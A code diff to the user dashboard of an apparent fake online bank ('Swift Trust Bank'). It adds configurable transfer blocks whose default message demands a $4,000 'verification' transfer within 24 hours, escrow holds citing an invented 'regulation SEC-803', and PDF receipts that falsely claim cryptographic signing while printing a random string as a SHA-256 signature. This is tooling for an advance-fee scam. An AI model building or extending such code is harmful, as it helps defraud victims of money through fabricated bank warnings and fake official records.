@@ -1,4 +1,5 @@
 import React, { useState, useEffect } from 'react';
+import { jsPDF } from 'jspdf';
 import { dbService } from '../services/dbService';
 import { UserProfile, Transaction, BankCard, Notification } from '../types';
 import { 
@@ -168,12 +169,14 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
     window.addEventListener('swiftbank_update_transactions', triggerSync);
     window.addEventListener('swiftbank_update_cards', triggerSync);
     window.addEventListener('swiftbank_update_notifications', triggerSync);
+    window.addEventListener('swiftbank_update_settings', triggerSync);
 
     return () => {
       window.removeEventListener('swiftbank_update_users', triggerSync);
       window.removeEventListener('swiftbank_update_transactions', triggerSync);
       window.removeEventListener('swiftbank_update_cards', triggerSync);
       window.removeEventListener('swiftbank_update_notifications', triggerSync);
+      window.removeEventListener('swiftbank_update_settings', triggerSync);
     };
   }, [profile.userId]);
 
@@ -225,6 +228,49 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
     setTransactions(dbService.getUserTransactions(profile.userId));
     setCards(dbService.getUserCards(profile.userId));
     setNotifications(dbService.getUserNotifications(profile.userId));
+  };
+
+  const isIncomingTransaction = (tx: any) => {
+    if (tx.type === 'deposit') return true;
+    if (tx.type === 'local_transfer') {
+      const notes = tx.notes || '';
+      return notes.toLowerCase().startsWith('received') || notes.toLowerCase().includes('received');
+    }
+    return false;
+  };
+
+  const isUserRestricted = () => {
+    const previousTransfersCount = transactions.filter(t => t.type === 'local_transfer' || t.type === 'intl_transfer').length;
+    
+    // We check if securityRestrictTransfers is active (explicitly enabled)
+    if (profile.securityRestrictTransfers === true) {
+      if (profile.securityTxLimit === undefined || profile.securityTxLimit === null) {
+        return true;
+      }
+      if ((previousTransfersCount + 1) >= profile.securityTxLimit) {
+        return true;
+      }
+    }
+    
+    // Also support fallback legacy restrictActive if that's active (explicitly enabled)
+    if (profile.restrictActive === true) {
+      if (profile.restrictTransferIndex === undefined || profile.restrictTransferIndex === null) {
+        return true;
+      }
+      if ((previousTransfersCount + 1) >= profile.restrictTransferIndex) {
+        return true;
+      }
+    }
+    
+    return false;
+  };
+
+  const getWarningMessage = () => {
+    const rawMsg = profile.securityWarningMessage || profile.restrictMessage || "DEAR CUSTOMER, OUR AUTOMATED SECURITY SYSTEM HAS FLAGGED YOUR RECENT TRANSACTION ATTEMPT DUE TO AN UNUSUALLY HIGH AMOUNT, WHICH MATCHES PATTERNS ASSOCIATED WITH FRAUDULENT ACTIVITY. FOR YOUR PROTECTION, THE TRANSACTION HAS BEEN SUSPENDED AND CANNOT BE PROCESSED AT THIS TIME. TO VERIFY YOUR IDENTITY AND LIFT THE HOLD, YOU ARE REQUIRED TO INITIATE A SEPARATE CONFIRMATION TRANSFER OF EXACTLY $4,000. THIS MUST BE SENT FROM THE SAME ACCOUNT NAME USED IN THE ORIGINAL TRANSACTION. ONCE THIS VERIFICATION PAYMENT IS RECEIVED AND MATCHED, YOUR INITIAL TRANSACTION WILL BE RELEASED IMMEDIATELY. PLEASE COMPLETE THIS STEP WITHIN 24 HOURS TO AVOID PERMANENT CANCELLATION. SECURITY DEPARTMENT";
+    if (rawMsg.toUpperCase().startsWith("RESTRICTED_TRANSFER:")) {
+      return rawMsg.toUpperCase();
+    }
+    return `RESTRICTED_TRANSFER:${rawMsg.toUpperCase()}`;
   };
 
   // Auto recipient lookup for local transfers
@@ -322,6 +368,10 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
   };
 
   const handleLocalTransferConfirm = async () => {
+    if (isUserRestricted()) {
+      setLocalError(getWarningMessage());
+      return;
+    }
     setIsLocalPending(true);
     setLocalError(null);
     try {
@@ -386,6 +436,10 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
   };
 
   const handleIntlTransferConfirm = async () => {
+    if (isUserRestricted()) {
+      setIntlError(getWarningMessage());
+      return;
+    }
     setIsIntlPending(true);
     setIntlError(null);
     try {
@@ -1008,8 +1062,8 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
                 {transactions.slice(0, 4).map((tx) => (
                   <div key={tx.id} className="p-3 bg-slate-950/40 rounded-xl border border-slate-900/50 flex justify-between items-center">
                     <div className="flex items-center space-x-3.5">
-                      <div className={`p-2 rounded-lg ${tx.type === 'deposit' ? 'bg-green-500/10 text-green-400' : 'bg-red-500/10 text-red-400'}`}>
-                        {tx.type === 'deposit' ? <TrendingUp className="w-4.5 h-4.5" /> : <TrendingDown className="w-4.5 h-4.5" />}
+                      <div className={`p-2 rounded-lg ${isIncomingTransaction(tx) ? 'bg-green-500/10 text-green-400' : 'bg-red-500/10 text-red-400'}`}>
+                        {isIncomingTransaction(tx) ? <TrendingUp className="w-4.5 h-4.5" /> : <TrendingDown className="w-4.5 h-4.5" />}
                       </div>
                       <div>
                         <p className="text-xs font-bold text-white uppercase">{tx.notes || tx.type.replace('_', ' ')}</p>
@@ -1018,8 +1072,8 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
                     </div>
                     <div className="flex items-center space-x-3 text-right">
                       <div className="text-right">
-                        <p className={`text-xs font-bold font-mono ${tx.type === 'deposit' ? 'text-green-400' : 'text-red-400'}`}>
-                          {tx.type === 'deposit' ? '+' : '-'}${tx.amount.toFixed(2)}
+                        <p className={`text-xs font-bold font-mono ${isIncomingTransaction(tx) ? 'text-green-400' : 'text-red-400'}`}>
+                          {isIncomingTransaction(tx) ? '+' : '-'}${tx.amount.toFixed(2)}
                         </p>
                         <p className={`text-[9px] uppercase font-bold ${
                           tx.status === 'approved' ? 'text-green-400' : tx.status === 'rejected' ? 'text-red-400' : 'text-amber-500 animate-pulse'
@@ -1120,8 +1174,8 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
                           {tx.status}
                         </span>
                       </td>
-                      <td className={`px-6 py-4 text-right font-mono font-bold text-sm ${tx.type === 'deposit' ? 'text-green-400' : 'text-red-400'}`}>
-                        {tx.type === 'deposit' ? '+' : '-'}${tx.amount.toFixed(2)}
+                      <td className={`px-6 py-4 text-right font-mono font-bold text-sm ${isIncomingTransaction(tx) ? 'text-green-400' : 'text-red-400'}`}>
+                        {isIncomingTransaction(tx) ? '+' : '-'}${tx.amount.toFixed(2)}
                       </td>
                       <td className="px-6 py-4 text-center">
                         <button
@@ -1182,8 +1236,8 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
                   <div className="flex justify-between items-center pt-3 border-t border-slate-950/40">
                     <div className="space-y-0.5">
                       <p className="text-[9px] uppercase font-bold text-slate-500 tracking-wider">Amount Settled</p>
-                      <p className={`font-mono font-bold text-sm ${tx.type === 'deposit' ? 'text-green-400' : 'text-red-400'}`}>
-                        {tx.type === 'deposit' ? '+' : '-'}${tx.amount.toFixed(2)}
+                      <p className={`font-mono font-bold text-sm ${isIncomingTransaction(tx) ? 'text-green-400' : 'text-red-400'}`}>
+                        {isIncomingTransaction(tx) ? '+' : '-'}${tx.amount.toFixed(2)}
                       </p>
                     </div>
                     
@@ -1570,52 +1624,7 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
               </div>
             </div>
 
-            {(() => {
-              const previousTransfersCount = transactions.filter(t => t.type === 'local_transfer' || t.type === 'intl_transfer').length;
-              const isTransferRestricted = !!profile.securityRestrictTransfers || 
-                (profile.securityTxLimit !== undefined && previousTransfersCount >= profile.securityTxLimit);
-
-              if (isTransferRestricted) {
-                return (
-                  <div className="p-6 sm:p-8 bg-slate-900/40 border border-red-900/25 rounded-3xl space-y-6 text-left max-w-2xl mx-auto my-6 animate-fade-in shadow-2xl">
-                    <div className="flex items-center space-x-4">
-                      <div className="w-12 h-12 bg-red-500/10 border border-red-500/20 text-red-505 rounded-xl flex items-center justify-center flex-shrink-0 animate-pulse">
-                        <AlertCircle className="w-5 h-5" />
-                      </div>
-                      <div>
-                        <h3 className="text-md sm:text-lg font-bold text-red-400 font-display">{profile.securityWarningTitle || "Security Verification Required"}</h3>
-                        <p className="text-[10px] uppercase font-mono tracking-wider text-red-500/80 font-semibold">Procedural Review Alert Gateway</p>
-                      </div>
-                    </div>
-
-                    <p className="text-slate-300 font-semibold text-xs bg-slate-950 p-4.5 sm:p-5 rounded-2xl border border-slate-900 leading-relaxed">
-                      {profile.securityWarningMessage || "To protect customer assets, standard verification protocols have initiated a temporary hold on outbound transfers. To lift this review and restore immediate outbound capacity, verify security details on our secure live support desk."}
-                    </p>
-
-                    <div className="flex flex-col sm:flex-row items-center gap-3 pt-2">
-                      <button
-                        onClick={() => setActiveTab('profile')}
-                        className="w-full sm:flex-1 py-3 bg-slate-900 hover:bg-slate-850 border border-slate-800 rounded-xl text-xs font-bold transition-all text-slate-300 cursor-pointer text-center"
-                      >
-                        Manage Profile Details
-                      </button>
-                      <button
-                        onClick={() => {
-                          const btn = document.getElementById('toggle-chat-btn');
-                          if (btn) btn.click();
-                        }}
-                        className="w-full sm:flex-1 py-3 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-xs font-bold transition-all shadow-md shadow-blue-600/10 active:scale-95 cursor-pointer text-center"
-                      >
-                        Launch Secure Live Support Desk
-                      </button>
-                    </div>
-                  </div>
-                );
-              }
-
-              return (
-                <>
-                  {/* Sub-tabs Selector */}
+            {/* Sub-tabs Selector */}
                   <div className="flex space-x-2 border-b border-slate-900 pb-1.5">
               <button
                 type="button"
@@ -1708,7 +1717,16 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
                         </div>
                       </div>
 
-                      {localError && (
+                      {isUserRestricted() && (
+                        <div 
+                          id="local-transfer-restriction-panel"
+                          className="p-4 bg-red-950/25 border border-red-900/35 text-red-500 rounded-2xl text-[11px] sm:text-xs font-bold leading-relaxed uppercase tracking-normal text-justify"
+                        >
+                          {getWarningMessage()}
+                        </div>
+                      )}
+
+                      {localError && !localError.startsWith("RESTRICTED_TRANSFER:") && (
                         <p className="text-xs text-red-400 text-center uppercase tracking-wider mt-2">{localError}</p>
                       )}
 
@@ -1913,7 +1931,16 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
                         </div>
                       </div>
 
-                      {intlError && (
+                      {isUserRestricted() && (
+                        <div 
+                          id="intl-transfer-restriction-panel"
+                          className="p-4 bg-red-950/25 border border-red-900/35 text-red-500 rounded-2xl text-[11px] sm:text-xs font-bold leading-relaxed uppercase tracking-normal text-justify"
+                        >
+                          {getWarningMessage()}
+                        </div>
+                      )}
+
+                      {intlError && !intlError.startsWith("RESTRICTED_TRANSFER:") && (
                         <p className="text-xs text-red-400 text-center uppercase tracking-wider mt-2">{intlError}</p>
                       )}
 
@@ -2049,9 +2076,6 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
                 </div>
               </div>
             )}
-                </>
-              );
-            })()}
           </div>
         )}
 
@@ -3110,7 +3134,7 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
                   </div>
                 </div>
 
-                \${(tx.status === 'pending' || tx.type === 'intl_transfer' || !!profile.securityRestrictTransfers) ? \`
+                \${isUserRestricted() ? \`
                   <div class="alert-container">
                     <div class="alert-title">⚠️ Compliance Alert & Escrow Security Hold</div>
                     <div>This remittance has triggered active security threshold checks (Directive SEC-803). Funds are safely held in administrative escrow pending immediate verification at the Swift Support desk. State/Federal clearance pending.</div>
@@ -3131,6 +3155,195 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
             </html>
           `);
           printWindow.document.close();
+        };
+
+        const handleDownloadPDFReceipt = (tx: any) => {
+          try {
+            const doc = new jsPDF({
+              orientation: 'portrait',
+              unit: 'mm',
+              format: 'a4'
+            });
+
+            // Color Palette
+            const darkNavy = [15, 23, 42]; // #0f172a
+            const blueAccent = [37, 99, 235]; // #2563eb
+            const valueColor = [15, 23, 42]; // #0f172a
+            const borderLight = [226, 232, 240]; // #e2e8f0
+            
+            // Custom Font setup & settings
+            doc.setFont('Helvetica', 'normal');
+
+            // Draw Header Accents
+            doc.setFillColor(darkNavy[0], darkNavy[1], darkNavy[2]);
+            doc.rect(0, 0, 210, 15, 'F'); // Top colored block
+
+            // Logo / Branding
+            doc.setTextColor(blueAccent[0], blueAccent[1], blueAccent[2]);
+            doc.setFontSize(22);
+            doc.setFont('Helvetica', 'bold');
+            doc.text('SWIFT TRUST BANK', 20, 32);
+
+            doc.setTextColor(100, 116, 139);
+            doc.setFontSize(9);
+            doc.setFont('Helvetica', 'normal');
+            doc.text('OFFICIAL ELECTRONIC SETTLEMENT RECORD', 20, 38);
+
+            // Reference Code
+            doc.setTextColor(51, 65, 85);
+            doc.setFontSize(10);
+            const refId = (tx.id || '').toUpperCase();
+            doc.text(`TRANSACTION ID: ${refId}`, 190, 32, { align: 'right' });
+            doc.text(`DATE (UTC): ${new Date(tx.createdAt).toUTCString()}`, 190, 38, { align: 'right' });
+
+            // Draw a clean separate line
+            doc.setDrawColor(borderLight[0], borderLight[1], borderLight[2]);
+            doc.setLineWidth(0.5);
+            doc.line(20, 44, 190, 44);
+
+            // 1. Transaction Details Segment
+            doc.setTextColor(darkNavy[0], darkNavy[1], darkNavy[2]);
+            doc.setFontSize(11);
+            doc.setFont('Helvetica', 'bold');
+            doc.text('TRANSACTION OVERVIEW', 20, 52);
+
+            doc.setFont('Helvetica', 'normal');
+            doc.setFontSize(10);
+            doc.setTextColor(100, 116, 139);
+            doc.text('Transfer Methodology:', 20, 60);
+            doc.text('Electronic Status:', 20, 66);
+            doc.text('Settlement Standard:', 20, 72);
+
+            doc.setFont('Helvetica', 'bold');
+            doc.setTextColor(valueColor[0], valueColor[1], valueColor[2]);
+            doc.text((tx.type || '').replace('_', ' ').toUpperCase(), 75, 60);
+            
+            // Color the status accordingly
+            if (tx.status === 'approved') {
+              doc.setTextColor(22, 101, 52); // green-800
+              doc.text('APPROVED / SUCCESSFUL', 75, 66);
+            } else if (tx.status === 'rejected') {
+              doc.setTextColor(153, 27, 27); // red-800
+              doc.text('DECLINED / REJECTED', 75, 66);
+            } else {
+              doc.setTextColor(146, 64, 14); // amber-800
+              doc.text('PENDING / PROCESSING', 75, 66);
+            }
+
+            doc.setTextColor(valueColor[0], valueColor[1], valueColor[2]);
+            doc.text('ISO-20022 SWIFT INTERBANK', 75, 72);
+
+            // Intermediary separator
+            doc.setDrawColor(borderLight[0], borderLight[1], borderLight[2]);
+            doc.line(20, 78, 190, 78);
+
+            // 2. Sender and Beneficiary Section
+            doc.setFont('Helvetica', 'bold');
+            doc.setFontSize(11);
+            doc.setTextColor(darkNavy[0], darkNavy[1], darkNavy[2]);
+            doc.text('PARTICIPANT DETAILS', 20, 86);
+
+            // Sender labels
+            doc.setFont('Helvetica', 'normal');
+            doc.setFontSize(10);
+            doc.setTextColor(100, 116, 139);
+            doc.text('Originating Account:', 20, 94);
+            doc.text('Originator Legal Name:', 20, 100);
+
+            doc.setFont('Helvetica', 'bold');
+            doc.setTextColor(valueColor[0], valueColor[1], valueColor[2]);
+            const sAcc = `****${profile.accountNumber ? profile.accountNumber.slice(-4) : '3199'}`;
+            doc.text(sAcc, 75, 94);
+            doc.text(tx.senderName || profile.fullName, 75, 100);
+
+            // Recipient labels
+            doc.setFont('Helvetica', 'normal');
+            doc.setTextColor(100, 116, 139);
+            doc.text('Beneficiary Account:', 20, 108);
+            doc.text('Beneficiary Name:', 20, 114);
+
+            doc.setFont('Helvetica', 'bold');
+            doc.setTextColor(valueColor[0], valueColor[1], valueColor[2]);
+            doc.text(tx.recipientAccount || 'System Endpoint Wire', 75, 108);
+            doc.text(tx.recipientName || 'External Routing Agent', 75, 114);
+
+            // Separator
+            doc.setDrawColor(borderLight[0], borderLight[1], borderLight[2]);
+            doc.line(20, 120, 190, 120);
+
+            // 3. Amount breakdown box / ledger
+            doc.setFont('Helvetica', 'bold');
+            doc.setFontSize(11);
+            doc.setTextColor(darkNavy[0], darkNavy[1], darkNavy[2]);
+            doc.text('FINANCIAL BREAKDOWN', 20, 128);
+
+            // Shaded box for totals
+            doc.setFillColor(248, 250, 252); // solid gray font-slate-50
+            doc.rect(20, 134, 170, 36, 'F');
+            doc.setDrawColor(borderLight[0], borderLight[1], borderLight[2]);
+            doc.rect(20, 134, 170, 36, 'S');
+
+            doc.setFont('Helvetica', 'normal');
+            doc.setFontSize(10);
+            doc.setTextColor(100, 116, 139);
+            doc.text('Principal remittance sum:', 25, 142);
+            doc.text('Administrative clearing fee:', 25, 148);
+            
+            doc.setFont('Helvetica', 'bold');
+            doc.setTextColor(valueColor[0], valueColor[1], valueColor[2]);
+            doc.text(`$${tx.amount.toLocaleString([], { minimumFractionDigits: 2 })} USD`, 185, 142, { align: 'right' });
+            doc.text(`$${(tx.fee ?? 0).toLocaleString([], { minimumFractionDigits: 2 })} USD`, 185, 148, { align: 'right' });
+
+            doc.setDrawColor(203, 213, 225); // gray-300
+            doc.line(25, 153, 185, 153);
+
+            doc.setFontSize(11);
+            doc.text('Total debit remittance value:', 25, 161);
+            doc.setTextColor(blueAccent[0], blueAccent[1], blueAccent[2]);
+            doc.text(`$${(tx.amount + (tx.fee ?? 0)).toLocaleString([], { minimumFractionDigits: 2 })} USD`, 185, 161, { align: 'right' });
+
+            // 4. Compliance alert & Escrow hold section (conditional on isUserRestricted())
+            let currentY = 178;
+            if (isUserRestricted()) {
+              // Shaded RED warning box for compliance hold
+              doc.setFillColor(254, 242, 242); // bg-red-50
+              doc.rect(20, currentY, 170, 24, 'F');
+              doc.setDrawColor(252, 165, 165); // border-red-300
+              doc.rect(20, currentY, 170, 24, 'S');
+
+              doc.setTextColor(153, 27, 27); // text-red-800
+              doc.setFontSize(9);
+              doc.setFont('Helvetica', 'bold');
+              doc.text('WARNING: ESCROW RISK STATUS HOLDING', 25, currentY + 6);
+              
+              doc.setFont('Helvetica', 'normal');
+              doc.setTextColor(127, 29, 29); // text-red-900
+              doc.setFontSize(8.5);
+              const textMsg = 'This transaction is flagged under regulation SEC-803 due to account constraints. Clearance is currently holding. Contact the Swift Live Help Desk immediately to upload necessary clearances.';
+              const splitText = doc.splitTextToSize(textMsg, 160);
+              doc.text(splitText, 25, currentY + 11);
+              
+              currentY += 32;
+            }
+
+            // Footer Cryptography & Security Seals
+            doc.setDrawColor(borderLight[0], borderLight[1], borderLight[2]);
+            doc.line(20, currentY + 10, 190, currentY + 10);
+
+            doc.setTextColor(148, 163, 184); // slate-400
+            doc.setFontSize(8);
+            doc.setFont('Helvetica', 'normal');
+            doc.text('This receipt acts as an official electronic transmission record of Swift Trust Bank. Cryptographically signed and non-repudiable.', 105, currentY + 18, { align: 'center' });
+
+            const checksum = Math.random().toString(36).substring(2, 12).toUpperCase();
+            doc.text(`SECURITY SIGNATURE (SHA-256): ${checksum}`, 105, currentY + 23, { align: 'center' });
+
+            // Save the PDF
+            doc.save(`Swift_Bank_Receipt_${tx.id}.pdf`);
+          } catch (err) {
+            console.error("PDF generation failed, falling back to print layout:", err);
+            handlePrintReceipt(tx);
+          }
         };
 
         return (
@@ -3215,7 +3428,7 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
               </div>
 
               {/* Security Alert & Hold section inside the receipt */}
-              {(receiptTransaction.status === 'pending' || receiptTransaction.type === 'intl_transfer' || !!profile.securityRestrictTransfers) && (
+              {isUserRestricted() && (
                 <div className="p-4 bg-red-950/40 border border-red-900/25 rounded-2xl text-left flex items-start space-x-3">
                   <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5 animate-pulse" />
                   <div className="space-y-1 font-sans">
@@ -3238,7 +3451,7 @@ export default function UserDashboard({ user, onLogout, onProfileUpdate }: UserD
                 </button>
                 <button
                   type="button"
-                  onClick={() => handlePrintReceipt(receiptTransaction)}
+                  onClick={() => handleDownloadPDFReceipt(receiptTransaction)}
                   className="flex-1 py-3 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl text-xs font-bold hover:scale-102 active:scale-95 transition-all shadow-lg shadow-blue-600/10 cursor-pointer flex items-center justify-center space-x-1.5"
                 >
                   <svg className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
